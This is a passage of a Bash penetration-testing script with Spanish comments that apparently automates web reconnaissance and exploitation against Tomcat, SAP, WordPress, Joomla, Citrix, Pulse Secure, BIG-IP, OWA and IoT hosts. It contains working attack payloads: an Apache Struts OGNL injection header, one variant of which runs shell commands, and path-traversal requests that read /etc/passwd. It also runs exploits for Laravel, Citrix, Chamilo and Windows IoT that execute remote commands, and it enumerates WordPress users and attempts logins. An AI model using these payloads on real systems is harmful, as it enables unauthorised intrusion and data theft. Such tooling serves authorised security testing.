		grep "is behind" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt 2>/dev/null
		egrep -iq "is behind" .enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt
		greprc=$?
		if [[ $greprc -eq 1 ]]; then # si hay no hay firewall protegiendo la app
			waitWeb 0.3
			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
			command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
			echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt
			eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &
		fi
	fi
}


function enumeracionTomcat() {
    proto_http=$1
    host=$2
    port=$3

    #1: si no existe log
    if [[ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt" ]]; then
        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"

        command="$proxychains curl -k --max-time 10 '$proto_http'://$host:$port/cgi/ism.bat?&dir"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt &

    	curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null&

		# curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' $'https://target'
        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Nuclei tomcat $proto_http $host:$port"
        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/tomcat_'$MODE'.txt -no-color -include-rr -debug"
        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt 2>&1 &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module tomcat -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
    fi

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
        greprc=$?
        if [[ $greprc -eq 1 ]]; then

            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

                waitWeb 0.3
                echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"
                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
                sleep 1

                waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos por defecto ($host - Tomcat)"
				command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt 
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &

			fi  #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos jsp ($host - tomcat)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module jsp -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt
			fi #oscp
		fi	#NO CMS
	fi	#hosting domains
}

function enumeracionSAP () {
   proto_http=$1
   host=$2
   port=$3

   	#1: si no existe log
   	if [[ ! -e logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-nuclei.txt  ]]; then

		echo -e "\t\t[+] Enumerar SAP ($proto_http : $host : $port)"
		waitWeb 0.3
		SAP-scan -url=$proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-scan.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Nuclei SAP $proto_http $host:$port"
		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/sap.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-nuclei.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Revisando archivos comunes de SAP ($host - SAP)"
		web-buster -target $host -port $port -proto $proto_http -path $path_web -module sap -threads $hilos_web -redirects 0 -show404 -error404 'setValuesAutoCreation' >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosSAP.txt &
	fi
}


function enumeracionCMS () {
   proto_http=$1
   host=$2
   port=$3

	if [[ "$MODE" == "total" ]]; then
		echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
		$proxychains nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_nmapHTTPvuln.txt &
	fi

	#1: si no existe log
   	if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_CMScheck.txt"  ]]; then
		touch "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_CMScheck.txt"
		 #######  drupal  ######
		grep -qi drupal logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei Drupal ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt &
			# http://www.mipc.com.bo/node/9/devel/token
			if [[  "$MODE" == "total" ]]; then
				echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
				$proxychains droopescan scan drupal -u  "$proto_http"://$host --output json > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_droopescan.txt 2>/dev/null &
			fi
		fi

		#######  API  ######
		egrep -qi 'api-endpoint|Express' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] API test ("$proto_http"://"$host":"$port")"
			web-buster -target $host -port $port  -proto $proto_http -path $path_web -module api -threads $hilos_web -redirects 0 -show404 >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt &
		fi


		#######  yii  ######
		grep -qi yii logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei yii ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/yii_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiNuclei.txt &
			#peticiones get especificas para yii
			checkerWeb.py --tipo yii --url "$proto_http://$host:$port/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiTest.txt
		fi

		#######  laravel  ######
		grep -qi laravel logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei laravel ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/laravel_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravelNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravelNuclei.txt &
			laravel-rce-CVE-2021-3129.sh "$proto_http://$host:$port" 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravel-rce-CVE-2021-3129.txt  2>/dev/null
		fi

		#######  chamilo  ######
		grep -qi Chamilo logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t[+] Revisando vulnerabilidades de Chamilo ($host)"
			echo -e "\t\t[+] CVE-2023-34960 ("$proto_http"://"$host":"$port")"
			echo "chamilo-CVE-2023-34960.py -u \"$proto_http://$host:$port/\"  -c 'uname -a'" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt
			chamilo-CVE-2023-34960.py -u "$proto_http://$host:$port/"  -c 'uname -a' >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt &
		fi

		#######  wordpress  ######
		grep -qi wordpress logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Wordpress ($host)"

			checkerWeb.py --tipo registro --url "$proto_http://$host:$port/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt

			wordpress-scan -url $proto_http"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressPlugins.txt &
			xml-rpc-test -url $proto_http"://"$host":"$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-habilitado.txt &
			xml-rpc-login -url $proto_http"://"$host":"$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-login.txt &

			echo -e "\t\t[+] nuclei Wordpress ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/wordpress_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressNuclei.txt 2>&1 &

			wpscan  --update  >/dev/null
			echo -e "\t\t[+] Wordpress user enumeration ("$proto_http"://"$host":"$port")"
			#echo "$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto_http"://"$host":"$port" --format json"
			$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto_http"://"$host":"$port" --format json > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json &
			echo -e "\t\t[+] wordpress_ghost_scanner ("$proto_http"://"$host":"$port")"
			msfconsole -x "use scanner/http/wordpress_ghost_scanner;set RHOSTS $host; set RPORT $port ;run;exit" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressGhost.txt 2>/dev/null &

			wordpress-CVE-2022-21661.py $proto_http"://"$host":"$port/wp-admin/admin-ajax.php 1 > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressCVE~2022~21661.txt

			wordpress-version.py $proto_http"://"$host":"$port/ > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wordpressVersion.txt 2>/dev/null
			cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wordpressVersion.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_wordpressVersion.txt

			# https://github.com/roddux/wordpress-dos-poc/tree/master WordPress <= 5.3

			# si tiene el valor "internet" (se esta escaneando redes de internet) si no tiene valor se escanea un dominio
			if [[ "$FORCE" != "internet" ]]; then #ejecutar solo cuando se escanea por dominio y no masivamente por IP
				echo -e "\t\t[+] Revisando vulnerabilidades de wordpress (wpscan)"
				$proxychains wpscan --disable-tls-checks  --random-user-agent --url "$proto_http"://$host/ --enumerate ap,cb,dbe --api-token $TOKEN_WPSCAN --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt &
				sleep 5
				grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then
					url=`cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
					echo -e "\t\t[+] url $url ($host: $port)"
					if [[ ${url} == *"$host"*  ]];then
						echo -e "\t\t[+] Redireccion en wordpress $url ($host: $port)"
						$proxychains wpscan --disable-tls-checks --enumerate u  --random-user-agent --format json --url $url > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json &
						$proxychains wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token $TOKEN_WPSCAN --plugins-detection aggressive > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt &
					else
						echo -e "\t\t[+] Ya lo escaneamos por dominio"
					fi
				fi #redirect
			fi #total
		fi
		# curl -k https://$DOMINIO/wp-json/wp/v2/users
		# curl -k https://$DOMINIO/wp-json/akismet/v1
		# curl -k https://$DOMINIO/wp-json
		# curl -k https://$DOMINIO/wp-json/wp/v2/pages

		###################################

		#######  citrix  ######
		grep -qi citrix logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de citrix ($host)"
			$proxychains CVE-2019-19781.sh $host $port "cat /etc/passwd" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_citrixVul.txt &
		fi
		###################################

		#######  hadoop  ######
		grep -qi 'Hadoop Administration' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop ($host)"
			echo "$proxychains  nmap -n -Pn --script hadoop-namenode-info -p $port $host" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_hadoopNamenode.txt
			$proxychains nmap -n -Pn --script hadoop-namenode-info -p $port $host >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_hadoopNamenode.txt &
			#http://182.176.151.83:50070/dfshealth.html
			#http://182.176.151.83:50070/conf
			#docker run  -v "$PWD":/tmp -it exploit-legacy hdfsbrowser 182.176.151.83
		fi
		###################################

		#######  Hadoop YARN ResourceManager  ######
		grep -qi 'YARN' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop YARN ResourceManager ($host)"
			nuclei -u $host -t /root/.local/nuclei-templates/misconfiguration/hadoop-unauth-rce.yaml  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_hadoop-rce.txt
		fi
		###################################


		#######  Pulse secure  ######
		grep -qi pulse logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"
			$proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_pulseVul.txt &

		fi
		##################################


		#######  OWA  ######
		egrep -qi "Outlook|owa" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de OWA($host)"

			if [[ ! -z "$URL"  ]];then
				owa_version=`grep -roP 'owa/auth/\K[^/]+' webClone/"$host" | head -1 | cut -d ':' -f2`
				owa.pl -version $owa_version  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2020-0688.txt
			else
				$proxychains owa.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2020-0688.txt &
			fi
			#CVE-2020-0688

			#https://github.com/MrTiz/CVE-2020-0688 authenticated

			#CVE-2021-34473
			nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxyshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxyshell.txt

			#CVE-2022-41040
			nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxynoshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxynoshell.txt

		fi
		###################################



		#######  joomla  ######
		grep -qi joomla logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"

			echo "juumla.sh -u "$proto_http"://$host:$port/ " > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt
			juumla.sh -u "$proto_http"://$host:$port/ >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt 2>/dev/null &

			joomla_version.pl -host $host -port $port -path / > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_joomla-version.txt &

			#joomla-cd.rb "$proto_http://$host" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt &
			echo -e "\t\t[+] Nuclei Joomla ($host)"
			nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/joomla_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt &

			echo -e "\t\t[+] Revisando si el registro esta habilitado"
			checkerWeb.py --tipo registro --url "$proto_http://$host:$port/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt
		fi
		###################################

		#######  WAMPSERVER  ######
		grep -qi WAMPSERVER logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Enumerando WAMPSERVER ($host)"
			$proxychains wampServer.pl -url "$proto_http"://$host/ > .enumeracion/"$host"_"$port-$path_web_sin_slash"_WAMPSERVER.txt &
		fi
		###################################


		#######  BIG-IP F5  ######
		grep -qi "BIG-IP" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"
			$proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_bigIPVul.txt &
		fi
		###################################

		#######  check point  ######
		grep -qi "Check Point SSL Network Extender" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Check Point SSL Network Extender  ($host)"
			CVE-2024-24919.py --ip $host  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2024-24919.txt &
		fi
		###################################

	fi

}


function testSSL ()
{
   proto_http=$1
   host=$2
   port=$3

    echo -e "\t\t[+] TEST SSL ($proto_http : $host : $port)"
	waitWeb 0.3
    #######  hearbleed ######
    echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
    echo "$proxychains  nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleed.txt 2>/dev/null
    $proxychains nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleed.txt 2>/dev/null &

    ##########################


    #######  Configuracion TLS/SSL (dominio) ######
	if [[ "$MODE" == "total" ]]; then
		echo -e "\t\t[+] Revisando configuracion TLS/SSL"
		testssl.sh --color 0  "https://$host:$port" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_testSSL.txt 2>/dev/null &
	fi

    ##########################

}

function enumeracionIOT ()
{
   proto_http=$1
   host=$2
   port=$3

   #1: si no existe log
   	if [[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_SirepRAT.txt"  ]]; then
		egrep -iq "Windows Device Portal" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [ $greprc -eq 0  ];then # si el banner es Apache y no se enumero antes
			echo -e "\t\t[+] Revisando SirepRAT ($host)"
			$proxychains SirepRAT.sh $host LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_SirepRAT.txt
			grep -ia 'IPv4' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_SirepRAT.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_SirepRAT.txt

		fi
	fi


	if [[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_backdoorFabrica.txt"  ]]; then
		#######  DLINK backdoor ######
		respuesta=`grep -i alphanetworks logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt`
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"
			echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backdoorFabrica.txt

		fi
		###########################
	fi

}
##################################################

#Caso 1: URL seteada y TARGETS=servicios/web-app-tmp.txt
#Caso 2: URL NO seteada y TARGETS=servicios/web.txt
echo "URL:$URL TARGETS:$TARGETS MODE:$MODE DOMINIO:$DOMINIO PROXYCHAINS:$PROXYCHAINS IP_LIST_FILE:$IP_LIST_FILE HOSTING:$HOSTING INTERNET:$INTERNET VERBOSE:$VERBOSE EXTRATEST:$EXTRATEST ESPECIFIC $ESPECIFIC SPEED $SPEED FORCE $FORCE"

############## Extraer informacion web y SSL
# web.txt
# 192.168.0.1:80:http
# www.ejemplo.com:443:https
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	#Si no existe log (primera corrida por IP)
	if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt"  ]]; then
		egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 && -z "$URL" ]];then
			echo -e "\t[+] host $host esta en la lista webApp.txt escaner por separado1 \n"
		else
			waitWeb 0.1
			echo -e "[+]Escaneando $host $port ($proto_http)"
			if [[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt" ]]; then
				echo -e "\t[i] Identificacion de técnologia usada en los servidores web"
				webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 4 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt 2>/dev/null &
				if [[ "$proto_http" == "https" && "$HOSTING" == "n" ]] ;then
					echo -e "\t[+]Obteniendo dominios del certificado SSL"
					$proxychains get_ssl_cert $host $port | grep -v 'failed' > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt  2>/dev/null &
				fi  ##### extract domains certificate
			fi
		fi
	fi #check
done

waitFinish


################ buscar dominios y host virtuales
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	#Verificar que no se obtuvo ese dato
	if [ -e logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_vhosts.txt ]; then
		echo "ya se reviso2"
	else
		egrep -iq "apache|nginx|kong|IIS" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
		greprc=$?
		if [[ "$HOSTING" == 'n' ]] && [[ $greprc -eq 0 ]]; then
			echo -e "\t[+]  Buscando hosts virtuales en $host:$port"
			waitWeb 0.1
			nmap -Pn -sV -n -p $port $host 2>/dev/null | grep 'Host:' | grep '\.' | awk '{print $4}' | sort | uniq > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_domainNmap.txt &
			grep 'Dominio identificado' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | cut -d "^" -f3 | uniq > logs/enumeracion/"$host"_web_domainWebData.txt
		fi

		if [[ "$host_LIST_FILE" == *"importarMaltego"* ]]  && [[ ! -z "$DOMINIO" ]] && [[ "$HOSTING" == 'n' ]]; then	#Si escaneamos un dominio especifico fuzzer vhosts
			echo -e "\t[+] Fuzzing DOMINIO: $DOMINIO en busca de vhost ($proto_http://$host )"
			echo -e "\t[+] baseline"
			wfuzz -c -w /usr/share/lanscanner/vhost-non-exist.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$host -t 100 -f logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_vhosts~baseline.txt	2>/dev/null
			words=`cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_vhosts~baseline.txt | grep 'C=' | awk '{print $5}'`
			echo "words $words"

			cat importarMaltego/subdominios.csv | cut -d ',' -f2 | cut -d '.' -f1 | sort |uniq > subdominios.txt
			cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt >> subdominios.txt

